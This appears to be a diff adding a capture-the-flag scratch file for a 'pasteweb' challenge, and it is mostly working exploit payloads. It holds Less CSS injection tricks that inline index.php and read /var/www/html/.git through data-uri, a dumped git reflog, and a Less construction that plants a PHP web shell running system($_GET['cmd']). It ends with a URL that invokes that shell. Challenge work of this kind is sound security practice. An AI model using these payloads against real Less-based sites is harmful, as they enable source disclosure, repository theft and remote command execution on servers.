@@ -1,0 +1,49 @@
+@images: "share.php";
+
+body {
+  color: #444;
+  background: url("https://pasteweb.ctf.zoolab.org/@{images}");
+}
+
+
+
+possible
+@aaa: inline;
+@bbb: "index.php";
+@import (@{aaa}) "@{bbb}" ;
+
+
+
+/* .htaccess  .git  /sandbox/  server-status  */
+
+
+
+
+p {
+  color: data-uri('/var/www/html/.git/');
+}
+head : ref: refs/heads/master
+master : f7fac4b9675f72b3333c732e7ed5a0066d78599d
+
+0000000000000000000000000000000000000000 342f9707a7d583d5f3a01de411c89ffb575ffa5d developer <developer@gmail.xxxx> 1670351182 +0000	commit (initial): add index.php
+342f9707a7d583d5f3a01de411c89ffb575ffa5d 15fd6d85c1b355714a82e6a53d2e99c2d59a24e6 developer <developer@gmail.xxxx> 1670351201 +0000	commit: add edithtml.php
+15fd6d85c1b355714a82e6a53d2e99c2d59a24e6 60b33b090f558c7b550ec5d75e9a95eef0cffff6 developer <developer@gmail.xxxx> 1670351220 +0000	commit: add editcss.php
+60b33b090f558c7b550ec5d75e9a95eef0cffff6 be66c820985835bcd97948d12898ec2cfea2c996 developer <developer@gmail.xxxx> 1670351241 +0000	commit: add view.php
+be66c820985835bcd97948d12898ec2cfea2c996 aa2541213d0258a58f8ccfea6a0687ec3af67d46 developer <developer@gmail.xxxx> 1670351258 +0000	commit: add download.php
+aa2541213d0258a58f8ccfea6a0687ec3af67d46 4214c43421c5749683988cf2aede1b72d43e0370 developer <developer@gmail.xxxx> 1670351289 +0000	commit: add share.php
+4214c43421c5749683988cf2aede1b72d43e0370 162665e2c0a4db21e3182956b98277d0fbca862e developer <developer@gmail.xxxx> 1670351335 +0000	commit: download library lessc.ini.php
+162665e2c0a4db21e3182956b98277d0fbca862e 50407b409e59886bb7387699b0d78532975e8b09 developer <developer@gmail.xxxx> 1670351383 +0000	commit: Add simple WAF so that Less will not leak php source code
+50407b409e59886bb7387699b0d78532975e8b09 55cd657fc6832fc0fffdfb60ebe0f6576f8834c3 developer <developer@gmail.xxxx> 1670354123 +0000	commit: Use full tag instead of short tag
+55cd657fc6832fc0fffdfb60ebe0f6576f8834c3 d91f71edace9913e67091702f391659fe1a5755e developer <developer@gmail.xxxx> 1670354776 +0000	commit: Reduce the tiem interval
+d91f71edace9913e67091702f391659fe1a5755e 1df964ce7aa6657f20f60a4639e4b01c3e81c6cd developer <developer@gmail.xxxx> 1670354827 +0000	commit (amend): Reduce the allowed time difference in login page
+1df964ce7aa6657f20f60a4639e4b01c3e81c6cd 7d7ccfd5ddfd6714a4e712e560924704ddb9c42e developer <developer@gmail.xxxx> 1670355901 +0000	commit: Use full tag instead of short tag again
+7d7ccfd5ddfd6714a4e712e560924704ddb9c42e f7fac4b9675f72b3333c732e7ed5a0066d78599d developer <developer@gmail.xxxx> 1670356511 +0000	commit: Add flag
+
+
+@my-selector: php ;
+<?@{my-selector} system($_GET['cmd']); ?> {
+  font-weight: bold;
+
+}
+
+https://pasteweb.ctf.zoolab.org/sandbox/a98f6f64e6cdfac22ab2ffd15a7241e3/qqq.php?cmd=ls%20../
